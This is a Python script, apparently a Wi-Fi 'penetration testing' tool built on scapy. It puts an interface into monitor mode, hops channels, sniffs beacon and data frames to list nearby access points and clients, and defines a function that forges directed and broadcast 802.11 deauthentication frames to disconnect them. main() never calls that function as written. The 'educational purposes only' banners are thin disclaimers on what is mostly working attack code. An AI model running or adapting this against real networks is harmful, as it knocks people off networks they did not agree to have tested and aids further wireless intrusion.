#!/usr/bin/env python3

import argparse
import fcntl
import logging
import os
import socket
import struct
import sys
import time
from threading import Thread, Event
from typing import List, Tuple

from scapy.all import *

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Console colors
COLORS = {
    'W': '\033[0m',   # white (normal)
    'R': '\033[31m',  # red
    'G': '\033[32m',  # green
    'O': '\033[33m',  # orange
    'B': '\033[34m',  # blue
    'P': '\033[35m',  # purple
    'C': '\033[36m',  # cyan
    'GR': '\033[37m', # gray
    'T': '\033[93m',  # tan
}

def color_print(color: str, text: str) -> None:
    print(f"{COLORS.get(color, '')}{text}{COLORS['W']}")

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Wireless Network Penetration Testing Tool")
    parser.add_argument("-i", "--interface", help="Choose monitor mode interface.")
    parser.add_argument("-c", "--channel", help="Listen on and deauth only clients on the specified channel.")
    parser.add_argument("-m", "--maximum", type=int, help="Maximum number of clients to deauth.")
    parser.add_argument("-t", "--timeinterval", type=float, default=0, help="Time interval between packets being sent.")
    parser.add_argument("-p", "--packets", type=int, default=1, help="Number of packets to send in each deauth burst.")
    parser.add_argument("-d", "--directedonly", action="store_true", help="Only send directed deauth packets.")
    parser.add_argument("-a", "--accesspoint", help="MAC address of a specific access point to target.")
    parser.add_argument("--world", action="store_true", help="Scan 13 channels instead of 11 (non-North American).")
    return parser.parse_args()

def get_interface_mac(iface: str) -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', iface[:15].encode('utf-8')))
    return ':'.join('%02x' % b for b in info[18:24])

def start_monitor_mode(interface: str) -> str:
    logger.info(f"Starting monitor mode on {interface}")
    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode monitor")
    os.system(f"ifconfig {interface} up")
    return interface

def channel_hop(mon_iface: str, args: argparse.Namespace, stop_event: Event) -> None:
    max_channel = 13 if args.world else 11
    while not stop_event.is_set():
        for channel in range(1, max_channel + 1):
            if args.channel:
                channel = int(args.channel)
            os.system(f"iwconfig {mon_iface} channel {channel}")
            time.sleep(0.5)
            if args.channel:
                break

def deauth_attack(clients_aps: List[Tuple[str, str, str, str]], aps: List[Tuple[str, str, str]], args: argparse.Namespace) -> None:
    for client, ap, channel, ssid in clients_aps:
        if args.channel and channel != args.channel:
            continue
        deauth_pkt = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
        send(deauth_pkt, count=args.packets, inter=args.timeinterval, verbose=False)
    
    if not args.directedonly:
        for ap, channel, ssid in aps:
            if args.channel and channel != args.channel:
                continue
            deauth_pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap, addr3=ap) / Dot11Deauth()
            send(deauth_pkt, count=args.packets, inter=args.timeinterval, verbose=False)

def packet_handler(pkt, clients_aps: List[Tuple[str, str, str, str]], aps: List[Tuple[str, str, str]], args: argparse.Namespace) -> None:
    if pkt.haslayer(Dot11):
        if pkt.type == 0 and pkt.subtype == 8:  # Beacon frame
            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
            bssid = pkt[Dot11].addr3
            try:
                channel = int(ord(pkt[Dot11Elt:3].info))
            except:
                channel = 0
            ap = (bssid, str(channel), ssid)
            if ap not in aps:
                aps.append(ap)
                logger.info(f"Discovered AP: {bssid} on channel {channel} with SSID {ssid}")
        elif pkt.type == 2:  # Data frame
            client = pkt.addr2
            ap = pkt.addr1
            if client != ap:
                client_ap = (client, ap, "0", "")  # Channel and SSID unknown for client
                if client_ap not in clients_aps:
                    clients_aps.append(client_ap)
                    logger.info(f"Discovered client: {client} associated with AP: {ap}")

def main():
    args = parse_args()
    
    print(r"""
 _____ __  __   __    __  _  _ _ __  ___ _ 
|_   _/  \| _\ /  \ /' _/| || | |_ \| __| |
  | || /\ | v | /\ |`._`.| >< | |_\ | _|| |
  |_||_||_|__/|_||_||___/|_||_|_/___|___|_|
      [ EDUCATIONAL PURPOSE ONLY? ]
             TADASHIJEI.COM
    """)
    print("Welcome to the Wireless Network Penetration Testing Tool")
    print("This tool is for educational and authorized testing purposes only.")
    print("Ensure you have proper permissions before proceeding.\n")
    
    conf.verb = 0  # Suppress Scapy output
    
    if os.geteuid() != 0:
        logger.error("This script must be run as root.")
        sys.exit(1)
    
    mon_iface = start_monitor_mode(args.interface)
    mon_mac = get_interface_mac(mon_iface)
    
    clients_aps: List[Tuple[str, str, str, str]] = []
    aps: List[Tuple[str, str, str]] = []
    
    stop_event = Event()
    channel_hopper = Thread(target=channel_hop, args=(mon_iface, args, stop_event))
    channel_hopper.start()
    
    try:
        sniff(iface=mon_iface, prn=lambda pkt: packet_handler(pkt, clients_aps, aps, args), store=0)
    except KeyboardInterrupt:
        logger.info("Stopping...")
    finally:
        stop_event.set()
        channel_hopper.join()
        os.system(f"ifconfig {mon_iface} down")
        os.system(f"iwconfig {mon_iface} mode managed")
        os.system(f"ifconfig {mon_iface} up")
        logger.info("Restored network interface to managed mode.")

if __name__ == "__main__":
    main()

print("This script is for educational purposes only. Ensure you have proper authorization before using it on any network.")
